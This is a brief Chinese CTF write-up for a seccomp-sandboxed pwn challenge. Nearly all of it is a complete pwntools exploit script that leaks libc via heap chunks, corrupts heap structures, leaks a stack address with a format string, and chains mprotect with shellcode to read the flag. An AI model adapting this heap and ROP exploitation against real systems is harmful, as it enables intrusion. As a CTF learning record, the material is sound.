lgd

---
title: 2020 NewYear lgd
date: 2020.03.21 19:14
tags:
- seccomp
categories:
- pwn       #分类
- Libc    #二级目录
top:
---
有沙盒功能，使用seccomp-tools dump ./pwn
之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。
```
#coding=utf-8

##########################################################################
# File Name: pwn_exp.py
# Author: sofr
# mail: rainb0w.541.bai@gmail.com
# Created Time: Sat Mar  7 09:36:57 2020
#########################################################################

from pwn import *
import sys
context.log_level = "debug"
context(arch='amd64', os='linux')

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sf = lambda x,y:p.sendafter(x,y)
slf = lambda x,y:p.sendlineafter(x,y)
l64_addr = lambda x:u64(x.ljust(0x8,'\x00'))
l32_addr = lambda x:u32(x.ljust(0x4,'\x00'))
drop_end = lambda x,y:x.split(y)[0]
getshell = lambda :p.interactive()

binary='./pwn'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'

global p
libc = ELF(libc_name)
bin = ELF(binary)

if len(sys.argv) > 1:
    p=remote(sys.argv[1],int(sys.argv[2]))
else:
    p=process([binary],env={'LD_PRELOAD':libc_name})

def ShowAddress(s,addr):
    print('\033[1;31m%s: 0x%x\033[0m'%(s,addr))

def Success(context):
    success('\033[1;32m%s\033[0m'%(context))

def Error(context):
    warn('\033[1;31m%s\033[0m'%(context))

def debug():
    Success(pidof(p))
    raw_input('\033[1;31mDeBug\033[0m')

def add(size,content):
    slf(">> ","1")
    slf("\n",str(size))
    slf("\n",content)

def dele(idx):
    slf(">> ","2")
    slf("\n",str(idx))

def show(idx):
    slf(">> ","3")
    slf("\n",str(idx))

def edit(idx,content):
    slf(">> ","4")
    slf("\n",str(idx))
    sf("___c___r__s__++___c___new_content ?",content)

def pwn():
    slf("\n","sofr_is_cool")
    add(0x60,"a")
    add(0x90,"n")
    add(0x60,"n")
    add(0x70,"n")
    dele(1)
    dele(0)
    dele(2)
    dele(3)
    add(0x40,"a"*8)
    show(0)
    libc_addr = l64_addr(ru("\n")[:-1]) - 0x3c4c08
    add(0x40,"a"*0x100)#1
    edit(1,p64(0)*9+p64(0x71)+p64(libc_addr+0x3c4b50)+'\x00'*0x60+p64(0x81)+p64(0x71))
    add(0x60,"n"*200)#2
    add(0x70,"n"*200)#3
    add(0x60,"n"*200)#4
    edit(4,p64(0)*3+p64(0x6032e0))
    add(0x60,"n"*0x60)#5
    edit(5,p64(0x00000000006032f0)+p64(libc_addr+0x3c67a8)+p64(0x6033c0))
    edit(3,p64(0x55800+libc_addr))
    edit(4,"%6$p|")
    dele(4)
    stack_addr = int(ru("|")[:-1],16)
    shellcode = shellcraft.amd64.linux.cat('./flag')
    #shellcode = shellcraft.amd64.pushstr("./flag")
    #shellcode += shellcraft.amd64.linux.open('rsp',0,0)
    #shellcode += shellcraft.amd64.linux.read('rax','rsp',0)
    #shellcode += shellcraft.amd64.linux.write(1, 'rsp', 100)
    shellcode = asm(shellcode)
    print len(shellcode)
    edit(2,p64(0x00000000006032f0)+p64(libc_addr+0x3c67a8)+p64(stack_addr+0x48)+p64(0x603260)+p64(libc_addr+libc.symbols['mprotect'])+shellcode)
    edit(5,p64(0x0000040000000400)*10)
    debug()
    file_p = 0x603360
    edit(4,p64(0x4023AA)+p64(0)+p64(1)+p64(0x603310)+p64(7)+p64(0x1000)+p64(0x00603000)+p64(0x402390)+p64(0)*7+p64(0x603318))
    #dele(1)
    #dele(0)
    ShowAddress("libc_addr",libc_addr)
    ShowAddress("stack_addr",stack_addr)
    debug()
    getshell()

pwn()
```
